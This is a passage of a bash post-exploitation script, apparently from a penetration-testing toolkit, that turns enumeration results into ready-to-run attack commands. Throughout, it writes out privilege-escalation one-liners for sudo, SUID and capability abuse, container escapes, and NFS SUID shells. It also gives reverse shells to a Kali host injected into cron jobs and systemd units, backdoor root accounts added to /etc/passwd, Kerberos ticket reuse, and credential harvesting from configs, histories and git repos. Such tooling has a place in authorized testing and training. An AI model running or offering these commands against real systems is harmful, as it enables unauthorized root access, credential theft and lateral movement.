                awk -F: '$3 >= 1000 && $3 < 65534 {print "ssh -i '"${kf}"' "$1"@'"${THIS_HOST_IP}"'"}' \
                    "${OUTDIR}/creds/passwd.txt" 2>/dev/null | head -5
            fi
            echo "ssh -i ${kf} root@${THIS_HOST_IP}"
            echo "ssh -i ${kf} ${CUR_USER}@${THIS_HOST_IP}"
            echo ""
        done

        # ── Internal listeners ─────────────────────────────────────────
        if [[ -s "${OUTDIR}/network/internal_listeners.txt" ]]; then
            has_actions=true
            echo "[ INTERNAL LISTENERS — tunnel from Kali ]"
            echo "------------------------------------------------------------"
            echo "# These services only listen on 127.0.0.1 — must tunnel to reach from Kali"
            while IFS= read -r line; do
                local port
                port=$(echo "${line}" | grep -oP '127[.:][0-9.]+[:%]\K[0-9]+' | head -1)
                [[ -z "${port}" ]] && continue
                echo "# Port ${port} (internal only):"
                echo "ssh -N -L 127.0.0.1:${port}:127.0.0.1:${port} ${CUR_USER}@${THIS_HOST_IP}"
                echo "# OR: ${SCRIPT_DIR}/pivotr.sh ssh --type local --local-port ${port} --target-ip 127.0.0.1 --target-port ${port} --pivot-ip ${THIS_HOST_IP}"
                echo "# Then connect: <tool> 127.0.0.1 ${port}"
                echo ""
            done < "${OUTDIR}/network/internal_listeners.txt"
        fi

        # ── Sudo NOPASSWD ──────────────────────────────────────────────
        if [[ -r "${OUTDIR}/system/sudo_rights.txt" ]]; then
            local nopasswd_entries
            nopasswd_entries=$(grep -i "NOPASSWD" "${OUTDIR}/system/sudo_rights.txt" 2>/dev/null | grep -v '^\s*#')
            if [[ -n "${nopasswd_entries}" ]]; then
                has_actions=true
                echo "[ SUDO NOPASSWD — escalation commands ]"
                echo "------------------------------------------------------------"
                echo "# GTFObins: https://gtfobins.github.io/"
                echo ""
                while IFS= read -r entry; do
                    [[ -z "${entry}" ]] && continue
                    local bin
                    bin=$(echo "${entry}" | grep -oP 'NOPASSWD:\s*\K\S+' | head -1)
                    bin=$(basename "${bin:-unknown}" 2>/dev/null)
                    echo "# Entry: ${entry}"
                    case "${bin}" in
                        bash|sh|zsh|fish|dash|ksh)
                            echo "sudo ${bin} -p" ;;
                        vim|vi)
                            echo "sudo ${bin}  # inside vim: :!/bin/bash" ;;
                        nano)
                            echo "sudo ${bin}  # inside nano: Ctrl+R Ctrl+X  then: reset; bash 1>&0 2>&0" ;;
                        less|more)
                            echo "sudo ${bin} /etc/passwd  # then type: !bash" ;;
                        python|python2|python3)
                            echo "sudo ${bin} -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'" ;;
                        perl)
                            echo "sudo ${bin} -e 'exec \"/bin/bash\";'" ;;
                        ruby)
                            echo "sudo ${bin} -e 'exec \"/bin/bash\"'" ;;
                        find)
                            echo "sudo ${bin} /. -exec /bin/bash \\;" ;;
                        awk|gawk|nawk)
                            echo "sudo ${bin} 'BEGIN {system(\"/bin/bash\")}'" ;;
                        env)
                            echo "sudo ${bin} /bin/bash" ;;
                        nmap)
                            echo "echo 'os.execute(\"/bin/bash\")' > /tmp/nmap.nse && sudo ${bin} --script /tmp/nmap.nse" ;;
                        tee)
                            echo "echo 'ALL ALL=(ALL) NOPASSWD:ALL' | sudo ${bin} -a /etc/sudoers" ;;
                        cp)
                            echo "# Add passwordless root2 user:"
                            echo "openssl passwd -1 hacked | xargs -I{} echo 'root2:{}:0:0:root:/root:/bin/bash' | sudo ${bin} /dev/stdin /etc/passwd" ;;
                        chmod)
                            echo "sudo ${bin} +s /bin/bash && /bin/bash -p" ;;
                        chown)
                            echo "sudo ${bin} \$(id -un):\$(id -gn) /etc/shadow && cat /etc/shadow" ;;
                        *)
                            echo "# https://gtfobins.github.io/gtfobins/${bin}/#sudo" ;;
                    esac
                    echo ""
                done <<< "${nopasswd_entries}"
            fi
        fi

        # ── /etc/sudoers.d/* additional rules ──────────────────────────
        if [[ -s "${OUTDIR}/files/sudoers_d.txt" ]]; then
            if grep -qE '^\s*[^#].*ALL\s*=' "${OUTDIR}/files/sudoers_d.txt" 2>/dev/null; then
                has_actions=true
                echo "[ SUDOERS.D — additional sudo rules ]"
                echo "------------------------------------------------------------"
                echo "# Rules from /etc/sudoers.d/ that may grant privileges missed by 'sudo -l':"
                grep -E '^\s*[^#].*ALL\s*=' "${OUTDIR}/files/sudoers_d.txt" 2>/dev/null | head -20
                echo ""
                echo "# If a rule applies to your user/group, see:"
                echo "#   cat ${OUTDIR}/files/sudoers_d.txt"
                echo "# GTFObins: https://gtfobins.github.io/"
                echo ""
            fi
        fi

        # ── Privileged group membership ────────────────────────────────
        if [[ -s "${OUTDIR}/system/privileged_groups.txt" ]]; then
            local _priv_hits
            _priv_hits=$(grep -oE '\b(docker|lxd|lxc|disk|adm|shadow|wheel|sudo|video|systemd-journal|plugdev|_ssh)\b' \
                "${OUTDIR}/system/privileged_groups.txt" 2>/dev/null | sort -u)
            if [[ -n "${_priv_hits}" ]]; then
                has_actions=true
                echo "[ PRIVILEGED GROUP MEMBERSHIP ]"
                echo "------------------------------------------------------------"
                echo "# Current user is in: ${_priv_hits//$'\n'/, }"
                echo ""
                while IFS= read -r _pg; do
                    case "${_pg}" in
                        docker)
                            echo "# docker group — root via container mount:"
                            echo "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
                            echo "# If no alpine image, list local images: docker images"
                            echo "# Then substitute the image name into the command above."
                            echo "" ;;
                        lxd|lxc)
                            echo "# ${_pg} group — root via privileged container:"
                            echo "# On Kali: build alpine image (https://github.com/saghul/lxd-alpine-builder)"
                            echo "# Then on target:"
                            echo "lxc image import ./alpine-*.tar.gz --alias myalpine"
                            echo "lxc init myalpine privesc -c security.privileged=true"
                            echo "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true"
                            echo "lxc start privesc && lxc exec privesc /bin/sh"
                            echo "# Then: cd /mnt/root  (= host /)"
                            echo "" ;;
                        disk)
                            echo "# disk group — raw block read of /dev/sda = read any file:"
                            echo "debugfs /dev/sda       # then: cat /root/.ssh/id_rsa"
                            echo "# OR dump /etc/shadow:"
                            echo "debugfs -R 'cat /etc/shadow' /dev/sda1"
                            echo "" ;;
                        shadow)
                            echo "# shadow group — readable /etc/shadow:"
                            echo "cat /etc/shadow   # exfil to Kali, crack with hashcat -m 1800"
                            echo "" ;;
                        adm)
                            echo "# adm group — read /var/log/* (may contain passwords from sudo/ssh failures):"
                            echo "grep -riE 'password|passwd|secret' /var/log/ 2>/dev/null | head -20"
                            echo "" ;;
                        systemd-journal)
                            echo "# systemd-journal — journalctl may contain sensitive cmdline args:"
                            echo "journalctl --no-pager | grep -iE 'password|token|secret' | head -20"
                            echo "" ;;
                        wheel|sudo)
                            echo "# ${_pg} group — re-check 'sudo -l' (may require password even if NOPASSWD absent):"
                            echo "sudo -l"
                            echo "" ;;
                    esac
                done <<< "${_priv_hits}"
            fi
        fi

        # ── Docker socket accessible ──────────────────────────────────
        if [[ -s "${OUTDIR}/system/docker_socket.txt" ]]; then
            if grep -qE 'readable: YES|writable: YES' "${OUTDIR}/system/docker_socket.txt" 2>/dev/null; then
                has_actions=true
                echo "[ DOCKER SOCKET ACCESSIBLE — root via API ]"
                echo "------------------------------------------------------------"
                echo "# Docker socket is accessible to current user:"
                cat "${OUTDIR}/system/docker_socket.txt"
                echo ""
                echo "# Escape via CLI (requires 'docker' binary in PATH):"
                echo "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
                echo ""
                echo "# Escape via raw API (no docker CLI needed — curl --unix-socket):"
                echo "curl --unix-socket /var/run/docker.sock http://localhost/containers/json"
                echo "# Create + start a container with host / mounted:"
                echo "curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \\"
                echo "  -d '{\"Image\":\"alpine\",\"Cmd\":[\"chroot\",\"/mnt\",\"sh\"],\"HostConfig\":{\"Binds\":[\"/:/mnt\"]}}' \\"
                echo "  -X POST http://localhost/containers/create"
                echo ""
            fi
        fi

        # ── Non-standard SUID binaries ─────────────────────────────────
        if [[ -s "${OUTDIR}/files/suid_binaries.txt" ]]; then
            local common_suid_re="ping$|su$|sudo$|passwd$|newgrp$|chfn$|chsh$|gpasswd$|pkexec$|mount$|umount$|fusermount$|at$|crontab$|wall$|write$|ssh-agent$|pt_chown$|Xorg$|snap$|ubuntu-core-launcher$|dbus-daemon-launch-helper$"
            local interesting_suids
            interesting_suids=$(grep -vE "${common_suid_re}" "${OUTDIR}/files/suid_binaries.txt" 2>/dev/null)
            if [[ -n "${interesting_suids}" ]]; then
                has_actions=true
                echo "[ SUID BINARIES — exploitation hints ]"
                echo "------------------------------------------------------------"
                echo "# GTFObins: https://gtfobins.github.io/"
                echo ""
                while IFS= read -r suid_path; do
                    [[ -z "${suid_path}" ]] && continue
                    local suid_bin
                    suid_bin=$(basename "${suid_path}")
                    echo "# SUID: ${suid_path}"
                    case "${suid_bin}" in
                        bash|sh|zsh|dash)
                            echo "${suid_path} -p" ;;
                        find)
                            echo "${suid_path} /. -exec /bin/bash -p \\;" ;;
                        vim|vi)
                            echo "${suid_path} -c ':!/bin/bash -p'" ;;
                        nmap)
                            echo "echo 'os.execute(\"/bin/bash -p\")' > /tmp/s.nse && ${suid_path} --script /tmp/s.nse" ;;
                        python|python2|python3)
                            echo "${suid_path} -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'" ;;
                        perl)
                            echo "${suid_path} -e 'exec \"/bin/bash -p\";'" ;;
                        env)
                            echo "${suid_path} /bin/bash -p" ;;
                        awk|gawk)
                            echo "${suid_path} 'BEGIN {system(\"/bin/bash -p\")}'" ;;
                        cp)
                            echo "echo 'root2::0:0:root:/root:/bin/bash' >> /tmp/passwd_evil && cat /etc/passwd >> /tmp/passwd_evil"
                            echo "${suid_path} /tmp/passwd_evil /etc/passwd && su root2" ;;
                        tee)
                            echo "echo 'ALL ALL=(ALL) NOPASSWD:ALL' | ${suid_path} -a /etc/sudoers" ;;
                        *)
                            echo "# https://gtfobins.github.io/gtfobins/${suid_bin}/#suid" ;;
                    esac
                    echo ""
                done <<< "${interesting_suids}"
            fi
        fi

        # ── File capabilities ──────────────────────────────────────────
        if [[ -s "${OUTDIR}/files/capabilities.txt" ]]; then
            has_actions=true
            echo "[ FILE CAPABILITIES — exploitation hints ]"
            echo "------------------------------------------------------------"
            while IFS= read -r cap_line; do
                [[ -z "${cap_line}" ]] && continue
                local cap_path cap_caps cap_bin
                cap_path=$(echo "${cap_line}" | awk '{print $1}')
                cap_caps=$(echo "${cap_line}" | awk '{print $NF}')
                cap_bin=$(basename "${cap_path}")
                echo "# ${cap_line}"
                case "${cap_caps}" in
                    *cap_setuid*)
                        case "${cap_bin}" in
                            python|python2|python3)
                                echo "${cap_path} -c 'import os; os.setuid(0); os.execl(\"/bin/bash\", \"bash\", \"-p\")'" ;;
                            perl)
                                echo "${cap_path} -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'" ;;
                            ruby)
                                echo "${cap_path} -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'" ;;
                            node)
                                echo "${cap_path} -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", {stdio: \"inherit\"})'" ;;
                            *)
                                echo "# cap_setuid — https://gtfobins.github.io/gtfobins/${cap_bin}/#capabilities" ;;
                        esac ;;
                    *cap_dac_override*|*cap_dac_read_search*)
                        echo "# Can read/write any file — try shadow or root SSH key:"
                        echo "${cap_path} /etc/shadow"
                        echo "${cap_path} /root/.ssh/id_rsa" ;;
                    *cap_net_raw*)
                        echo "# Can sniff raw packets:"
                        echo "${cap_path} -i <INTERFACE> -w /tmp/capture.pcap" ;;
                    *cap_sys_ptrace*)
                        echo "# Can ptrace root processes — inject shellcode or dump creds:"
                        echo "# Find a root process to inject into:"
                        echo "ps -eo pid,user,cmd | awk '\$2==\"root\"'"
                        echo "# gdb attach + call system() (gdb must also be available):"
                        echo "gdb -p <ROOT_PID>  # then: (gdb) call system(\"chmod +s /bin/bash\")"
                        echo "# OR use injector like: https://github.com/gaffe23/linux-inject" ;;
                    *cap_sys_module*)
                        echo "# Can load kernel modules — full root + kernel-mode:"
                        echo "# Build a malicious .ko that execs /bin/bash with setuid(0):"
                        echo "# See https://0xdf.gitlab.io/2020/09/26/htb-unbalanced.html (search 'cap_sys_module')"
                        echo "# After building reverse.ko:"
                        echo "${cap_path}  # to load — or insmod reverse.ko" ;;
                    *cap_chown*)
                        echo "# Can change ownership of any file — take over /etc/shadow or /etc/passwd:"
                        echo "${cap_path} \$(id -u) /etc/shadow && echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd" ;;
                    *cap_fowner*)
                        echo "# Can bypass file ownership checks for chmod/utime — flip mode bits:"
                        echo "${cap_path} /etc/shadow  # then chmod 777 /etc/shadow" ;;
                    *cap_setgid*)
                        echo "# Can change GID — escalate to group-privileged (docker/disk/shadow):"
                        case "${cap_bin}" in
                            python|python2|python3)
                                echo "${cap_path} -c 'import os; os.setgid(0); os.setegid(0); os.execl(\"/bin/bash\",\"bash\")'" ;;
                            *)
                                echo "# https://gtfobins.github.io/gtfobins/${cap_bin}/#capabilities" ;;
                        esac ;;
                    *)
                        echo "# https://gtfobins.github.io/gtfobins/${cap_bin}/#capabilities" ;;
                esac
                echo ""
            done < "${OUTDIR}/files/capabilities.txt"
        fi

        # ── NFS exports with no_root_squash ────────────────────────────
        if [[ -s "${OUTDIR}/files/nfs_exports.txt" ]]; then
            if grep -qE 'no_root_squash' "${OUTDIR}/files/nfs_exports.txt" 2>/dev/null; then
                has_actions=true
                echo "[ NFS no_root_squash — root-squash bypass ]"
                echo "------------------------------------------------------------"
                echo "# Exports allowing root writes:"
                cat "${OUTDIR}/files/nfs_exports.txt"
                echo ""
                echo "# From Kali (${KALI_IP}) — mount the share as root:"
                echo "sudo mkdir -p /mnt/nfsroot"
                echo "sudo mount -o rw,vers=3 ${THIS_HOST_IP}:<EXPORTED_PATH> /mnt/nfsroot"
                echo "# Drop a SUID shell:"
                echo "cat > /tmp/suidshell.c <<'EOF'"
                echo "#include <unistd.h>"
                echo "int main(){ setuid(0); setgid(0); execl(\"/bin/bash\",\"bash\",\"-p\",NULL); return 0; }"
                echo "EOF"
                echo "gcc /tmp/suidshell.c -o /mnt/nfsroot/suidshell"
                echo "sudo chown root:root /mnt/nfsroot/suidshell && sudo chmod 4755 /mnt/nfsroot/suidshell"
                echo "# Back on target:"
                echo "<EXPORTED_PATH>/suidshell    # spawns root shell"
                echo ""
            fi
        fi

        # ── Writable systemd units / init.d scripts ───────────────────
        if [[ -s "${OUTDIR}/files/writable_services.txt" ]]; then
            has_actions=true
            echo "[ WRITABLE SERVICE FILES — root via service restart ]"
            echo "------------------------------------------------------------"
            echo "# Writable systemd / init.d files (may run as root):"
            cat "${OUTDIR}/files/writable_services.txt"
            echo ""
            echo "# 1. Inspect the unit for the user/ExecStart line:"
            echo "#    grep -E '^(User|ExecStart)' <UNIT_FILE>"
            echo "# 2. If User=root (or missing), modify ExecStart to your payload:"
            echo "#    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1'"
            echo "# 3. Reload + restart:"
            echo "#    systemctl daemon-reload && systemctl restart <UNIT_NAME>"
            echo "# 4. Catch on Kali (${KALI_IP}):"
            echo "penelope -p 4444 -O"
            echo ""
        fi

        # ── SSH pivot inventory (known_hosts + config) ────────────────
        if find "${OUTDIR}/creds/" -maxdepth 1 -name "ssh_*" -type f 2>/dev/null | grep -q .; then
            has_actions=true
            echo "[ SSH PIVOT INVENTORY — other reachable hosts ]"
            echo "------------------------------------------------------------"
            echo "# SSH config and known_hosts reveal lateral-movement targets."
            echo ""
            local _sshinv
            for _sshinv in "${OUTDIR}/creds/"ssh_*known_hosts; do
                [[ -f "${_sshinv}" ]] || continue
                echo "# From $(basename "${_sshinv}"):"
                awk '{print $1}' "${_sshinv}" 2>/dev/null \
                    | tr ',' '\n' | grep -vE '^\|1\||^$' | sort -u | head -20
                echo ""
            done
            for _sshinv in "${OUTDIR}/creds/"ssh_*config; do
                [[ -f "${_sshinv}" ]] || continue
                echo "# From $(basename "${_sshinv}"):"
                grep -iE '^(Host |HostName |User )' "${_sshinv}" 2>/dev/null | head -30
                echo ""
            done
            echo "# Try pivoting with collected keys:"
            echo "for key in ${OUTDIR}/creds/key_*; do"
            echo "  for host in <HOST_FROM_ABOVE>; do"
            echo "    ssh -i \"\$key\" -o StrictHostKeyChecking=no ${CUR_USER}@\$host 'id; hostname'"
            echo "  done"
            echo "done"
            echo ""
        fi

        # ── Writable cron jobs ─────────────────────────────────────────
        if [[ -r "${OUTDIR}/files/cron_jobs.txt" ]]; then
            if grep -qvE '^#|^$|not readable|not accessible|no user crontab|no cron\.' \
                "${OUTDIR}/files/cron_jobs.txt" 2>/dev/null; then
                has_actions=true
                echo "[ CRON JOBS — check for writable script injection ]"
                echo "------------------------------------------------------------"
                echo "# 1. Review cron entries — find scripts that run as root:"
                echo "cat ${OUTDIR}/files/cron_jobs.txt"
                echo ""
                echo "# 2. If a cron script path is writable, inject reverse shell:"
                echo "echo 'bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1' >> /path/to/writable/cron_script.sh"
                echo ""
                echo "# 3. If /etc/crontab itself is writable:"
                echo "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1\"' >> /etc/crontab"
                echo ""
                echo "# 4. Catch shell on Kali (${KALI_IP}):"
                echo "penelope -p 4444 -O"
                echo ""
                echo "# 5. Use pspy64 to catch jobs not in visible crontab:"
                echo "./pspy64  # run in second session on target"
                echo ""
            fi
        fi

        # ── Reachable subnets ──────────────────────────────────────────
        if [[ -s "${OUTDIR}/network/reachable_subnets.txt" ]]; then
            has_actions=true
            echo "[ REACHABLE SUBNETS — pivot and scan ]"
            echo "------------------------------------------------------------"
            echo "# These subnets are reachable from this host — pivot then scan:"
            while IFS= read -r subnet; do
                [[ -z "${subnet}" ]] && continue
                echo "# Subnet: ${subnet}"
                echo "# On Kali — set up pivot first (use this host as pivot):"
                echo "${SCRIPT_DIR}/pivotr.sh ligolo --pivot-ip ${THIS_HOST_IP} --subnet ${subnet} --serve"
                echo "# OR: ${SCRIPT_DIR}/pivotr.sh ssh --type dynamic --pivot-ip ${THIS_HOST_IP} --pivot-user ${CUR_USER}"
                echo "# Then scan internally:"
                echo "sudo ${SCRIPT_DIR}/recon.sh --auto <INTERNAL_HOST_IP>   # replace with a host from ${subnet}"
                echo "# OR (SOCKS): proxychains sudo ${SCRIPT_DIR}/recon.sh --auto <INTERNAL_HOST_IP>"
                echo ""
            done < "${OUTDIR}/network/reachable_subnets.txt"
        fi

        # ── Kerberos tickets / ccache files ───────────────────────────
        if [[ -s "${OUTDIR}/creds/kerberos.txt" ]]; then
            if grep -qvE 'klist not available|no tickets|^=|^$' "${OUTDIR}/creds/kerberos.txt" 2>/dev/null || \
               grep -q 'krb5cc_\|\.ccache' "${OUTDIR}/creds/kerberos.txt" 2>/dev/null; then
                has_actions=true
                echo "[ KERBEROS TICKETS / CCACHE ]"
                echo "------------------------------------------------------------"
                echo "# Tickets or ccache files found — exfil and use from Kali:"
                echo ""
                echo "# 1. Check ticket contents on target:"
                echo "klist"
                echo "klist -e  # show encryption types"
                echo ""
                echo "# 2. Copy ccache file to Kali, then set KRB5CCNAME:"
                local ccache_line
                ccache_line=$(grep 'krb5cc_\|\.ccache' "${OUTDIR}/creds/kerberos.txt" 2>/dev/null | head -1)
                if [[ -n "${ccache_line}" ]]; then
                    echo "export KRB5CCNAME=${ccache_line}"
                else
                    echo "export KRB5CCNAME=/tmp/krb5cc_<ID>"
                fi
                echo ""
                echo "# 3. Use ticket for lateral movement:"
                # Try to extract domain, user, and DC FQDN from the klist output in kerberos.txt
                local _krb_principal _krb_user _krb_domain _krb_fqdn
                _krb_principal=$(grep -m1 'Principal:' "${OUTDIR}/creds/kerberos.txt" 2>/dev/null \
                    | grep -oP 'Principal:\s*\K\S+' || true)
                _krb_user="${_krb_principal%%@*}"
                _krb_domain=$(echo "${_krb_principal#*@}" | tr '[:upper:]' '[:lower:]')
                _krb_fqdn=$(grep -m1 'host/' "${OUTDIR}/creds/kerberos.txt" 2>/dev/null \
                    | grep -oP 'host/\K[^@\s]+' || true)
                _krb_user="${_krb_user:-<USER>}"
                _krb_domain="${_krb_domain:-${OffSec_DOMAIN:-<DOMAIN>}}"
                _krb_fqdn="${_krb_fqdn:-<DC_FQDN>}"
                echo "impacket-psexec -k -no-pass ${_krb_domain}/${_krb_user}@${_krb_fqdn}"
                echo "impacket-wmiexec -k -no-pass ${_krb_domain}/${_krb_user}@${_krb_fqdn}"
                echo "impacket-smbclient -k -no-pass ${_krb_domain}/${_krb_user}@${_krb_fqdn}"
                echo ""
                echo "# 4. Convert to impacket format if needed:"
                local _ccache_name
                _ccache_name=$(basename "${ccache_line:-krb5cc_X}" 2>/dev/null)
                echo "impacket-ticketConverter ${_ccache_name} ticket.ccache"
                echo ""
            fi
        fi

        # ── Shell histories ────────────────────────────────────────────
        local hist_files=()
        while IFS= read -r hf; do
            hist_files+=("${hf}")
        done < <(find "${OUTDIR}/creds/" -maxdepth 1 -name "history_*" -type f 2>/dev/null)
        if (( ${#hist_files[@]} > 0 )); then
            has_actions=true
            echo "[ SHELL HISTORIES — grep for credentials ]"
            echo "------------------------------------------------------------"
            for hf in "${hist_files[@]}"; do
                echo "# $(basename "${hf}"):"
                echo "grep -iE 'pass|sshpass|mysql.*-p|curl.*-u|wget.*--password|token|secret|key|sudo' '${hf}' 2>/dev/null"
                echo ""
            done
        fi

        # ── Config files with credential patterns ─────────────────────
        if [[ -s "${OUTDIR}/creds/config_files_with_creds.txt" ]]; then
            has_actions=true
            echo "[ CONFIG FILES WITH CREDENTIALS ]"
            echo "------------------------------------------------------------"
            echo "# Files containing password patterns — inspect each:"
            head -10 "${OUTDIR}/creds/config_files_with_creds.txt" | while IFS= read -r cred_line; do
                local cred_file
                cred_file=$(echo "${cred_line}" | awk '{print $1}' | sed 's/:.*//')
                [[ -z "${cred_file}" ]] && continue
                echo "# From: ${cred_line}"
            done
            echo ""
            echo "# Quick pass extraction from the collected file:"
            echo "grep -iE 'password[[:space:]]*[=:\"]+|DB_PASS|db_password|secret|api.?key' \\"
            echo "     '${OUTDIR}/creds/config_files_with_creds.txt'"
            echo ""
        fi

        # ── wp-config.php / .env / home credential files ──────────────
        local found_sensitive_creds=false
        for sens_file in "${OUTDIR}/creds/dotenv_"* "${OUTDIR}/creds/wpconfig_"*; do
            [[ -f "${sens_file}" ]] || continue
            found_sensitive_creds=true
        done
        for sens_homecred in "${OUTDIR}/creds/.netrc" "${OUTDIR}/creds/.my.cnf" \
                             "${OUTDIR}/creds/.pgpass" "${OUTDIR}/creds/dot_netrc" \
                             "${OUTDIR}/creds/dot_my.cnf"; do
            [[ -f "${sens_homecred}" ]] || continue
            found_sensitive_creds=true
        done
        if [[ "${found_sensitive_creds}" == "true" ]]; then
            has_actions=true
            echo "[ SENSITIVE CREDENTIAL FILES COLLECTED ]"
            echo "------------------------------------------------------------"
            for sens_file in "${OUTDIR}/creds/dotenv_"* "${OUTDIR}/creds/wpconfig_"*; do
                [[ -f "${sens_file}" ]] || continue
                echo "# $(basename "${sens_file}"):"
                echo "grep -iE 'DB_PASSWORD|DB_USER|DB_NAME|SECRET_KEY|APP_KEY|PASSWORD|TOKEN|API_KEY' '${sens_file}'"
                echo ""
            done
            for sens_homecred in "${OUTDIR}/creds/.netrc" "${OUTDIR}/creds/dot_netrc"; do
                [[ -f "${sens_homecred}" ]] || continue
                echo "# .netrc — machine/login/password entries:"
                echo "cat '${sens_homecred}'"
                echo ""
            done
            for sens_homecred in "${OUTDIR}/creds/.my.cnf" "${OUTDIR}/creds/dot_my.cnf"; do
                [[ -f "${sens_homecred}" ]] || continue
                echo "# .my.cnf — MySQL credentials:"
                echo "grep -E 'user|password|host' '${sens_homecred}'"
                echo ""
            done
        fi

        # ── Git repositories ───────────────────────────────────────────
        if [[ -s "${OUTDIR}/files/git_repos.txt" ]]; then
            has_actions=true
            echo "[ GIT REPOSITORIES — check for leaked credentials ]"
            echo "------------------------------------------------------------"
            while IFS= read -r git_dir; do
                [[ -z "${git_dir}" ]] && continue
                local repo_dir="${git_dir%/.git}"
                echo "# Repo: ${repo_dir}"
                # Check .git/config for credentialed remote URLs (https://user:pass@host/...)
                if [[ -r "${git_dir}/config" ]]; then
                    local _credurl
                    _credurl=$(grep -oE 'https?://[^[:space:]/]+:[^[:space:]/@]+@[^[:space:]]+' \
                        "${git_dir}/config" 2>/dev/null | head -5)
                    if [[ -n "${_credurl}" ]]; then
                        echo "# [!] Credentialed remote URLs in .git/config:"
                        while IFS= read -r _u; do echo "#     ${_u}"; done <<< "${_credurl}"
                    fi
                fi
                echo "git -C '${repo_dir}' log --all --oneline 2>/dev/null | head -20"
                echo "git -C '${repo_dir}' stash list 2>/dev/null"
                echo "git -C '${repo_dir}' log --all -p --follow -- '*.env' '*.conf' '*.ini' 2>/dev/null | grep -iE 'password|secret|token|key' | head -20"
                echo "# Look for creds in any commit, not just HEAD:"
                echo "git -C '${repo_dir}' log --all -p 2>/dev/null | grep -iE '^\\+.*pass|^\\+.*secret|^\\+.*token' | head -20"
                echo "# Check .git/config for auth tokens in remote URLs:"
                echo "grep -E 'url\\s*=' '${git_dir}/config' 2>/dev/null"
                echo ""
            done < "${OUTDIR}/files/git_repos.txt"
        fi

        # ── SQL / backup / database files ─────────────────────────────
        if [[ -s "${OUTDIR}/files/backup_files.txt" ]] || [[ -s "${OUTDIR}/files/database_files.txt" ]]; then
            has_actions=true
            echo "[ SQL / BACKUP / DATABASE FILES ]"
            echo "------------------------------------------------------------"
            if [[ -s "${OUTDIR}/files/backup_files.txt" ]]; then
                echo "# SQL dump / backup files — grep for credentials:"
                while IFS= read -r bak; do
                    [[ -z "${bak}" ]] && continue
                    case "${bak,,}" in
                        *.sql|*.dump)
                            echo "grep -iE \"INSERT INTO.*(user|password|account)|'[0-9a-f]{32,}'\" '${bak}' | head -10" ;;
                        *)
                            echo "strings '${bak}' | grep -iE 'password|passwd|secret' | head -10" ;;
                    esac
                done < "${OUTDIR}/files/backup_files.txt"
                echo ""
            fi
            if [[ -s "${OUTDIR}/files/database_files.txt" ]]; then
                echo "# SQLite / DB files — dump schema + look for passwords:"
                while IFS= read -r dbf; do
                    [[ -z "${dbf}" ]] && continue
                    echo "sqlite3 '${dbf}' '.tables' 2>/dev/null"
                    echo "sqlite3 '${dbf}' 'SELECT * FROM users LIMIT 10;' 2>/dev/null"
                    echo "strings '${dbf}' | grep -iE 'password|passwd|hash|admin' | head -10"
                    echo ""
                done < "${OUTDIR}/files/database_files.txt"
            fi
        fi

        # ── World-writable sensitive files ─────────────────────────────
        if [[ -s "${OUTDIR}/files/world_writable.txt" ]]; then
            if grep -qE '/etc/passwd|/etc/shadow|/etc/sudoers|/etc/cron' \
                "${OUTDIR}/files/world_writable.txt" 2>/dev/null; then
                has_actions=true
                echo "[ WORLD-WRITABLE CRITICAL FILES ]"
                echo "------------------------------------------------------------"
                if grep -q '/etc/passwd' "${OUTDIR}/files/world_writable.txt" 2>/dev/null; then
                    echo "# /etc/passwd is world-writable — add root-level user:"
                    echo "openssl passwd -1 hacked"
                    echo "echo 'r00t:<HASH_FROM_ABOVE>:0:0:root:/root:/bin/bash' >> /etc/passwd"
                    echo "su r00t  # password: hacked"
                    echo ""
                fi
                if grep -q '/etc/shadow' "${OUTDIR}/files/world_writable.txt" 2>/dev/null; then
                    echo "# /etc/shadow is world-writable — overwrite root hash:"
                    echo "openssl passwd -1 hacked"
                    echo "# Replace root hash in /etc/shadow with output above"
                    echo "su root  # password: hacked"
                    echo ""
                fi
                if grep -q '/etc/sudoers' "${OUTDIR}/files/world_writable.txt" 2>/dev/null; then
                    echo "# /etc/sudoers is world-writable:"
                    echo "echo '\$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
                    echo "sudo bash"
                    echo ""
                fi
            fi
        fi

        # ── NetworkManager PSK credentials ─────────────────────────────
        if [[ -s "${OUTDIR}/creds/networkmanager_creds.txt" ]]; then
            has_actions=true
            echo "[ NETWORKMANAGER SAVED PASSWORDS ]"
            echo "------------------------------------------------------------"
            echo "# Saved Wi-Fi / VPN credentials found:"
            echo "grep -A1 'psk\|password' '${OUTDIR}/creds/networkmanager_creds.txt'"
            echo ""
            echo "# Full dump:"
            echo "cat '${OUTDIR}/creds/networkmanager_creds.txt'"
            echo ""
            echo "# Feed plaintext passwords to sprayr.sh:"
            local _nm_pass
            _nm_pass=$(grep -m1 'psk=\|^password=' "${OUTDIR}/creds/networkmanager_creds.txt" 2>/dev/null \
                | cut -d= -f2 | tr -d '[:space:]' || true)
            _nm_pass="${_nm_pass:-<FOUND_PASSWORD>}"
            echo "${SCRIPT_DIR}/sprayr.sh -u '${CUR_USER}' -p '${_nm_pass}' -t ${THIS_HOST_IP}"
            echo "${SCRIPT_DIR}/sprayr.sh --from-creds   # after adding to ${TOOLKIT_ROOT:-~/toolkit}/creds.txt"
            echo ""
        fi

        if [[ "${has_actions}" == "false" ]]; then
            echo "No high-value actionable findings detected."
            echo "Review ${OUTDIR}/ manually or re-run with elevated privileges."
        fi

        echo "============================================================"
        echo "  END — Full output: ${OUTDIR}/"
        echo "============================================================"

    } > "${acfile}"

    cp "${acfile}" "${OUTDIR}/next_steps.txt" 2>/dev/null || true

    if [[ "${has_actions}" == "true" ]]; then
        echo ""
        success "Attack commands → ${acfile}"
        success "Next steps alias → ${OUTDIR}/next_steps.txt"
        echo -e "${RED}${BOLD}  ╔════════════════════════════════════════════════════════════╗${NC}"
